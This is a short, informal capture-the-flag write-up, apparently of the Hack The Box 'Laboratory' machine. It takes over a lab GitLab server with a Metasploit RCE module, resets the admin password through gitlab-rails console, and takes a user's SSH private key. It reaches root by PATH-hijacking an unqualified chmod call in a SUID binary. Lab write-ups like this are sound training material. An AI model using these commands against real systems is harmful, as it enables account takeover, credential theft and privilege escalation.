we found a subdomain git

we used metasploit ==git_rce_shell== to get a shell

there is also a manual way `https://0xdf.gitlab.io/2021/04/17/htb-laboratory.html`

then we found

`/etc/gitlab/gitlab.rb` file

```
bash -i
gitlab-rails console
irb will open up
user=User.find(1)
user.password = “87654321”
user.password_confirmation = “87654321”
user.save!
```

on sigining in again after log out we see admin settings and we can switch to dexter and get his ==id_rsa==

now we get user.txt

for root we saw docker-security on

`find / -perm -4000 2>/dev/null`

we found ==chmod== is being called without absolute path

so we did

```
#!/bin/bash 
/bin/bash
```

and got root
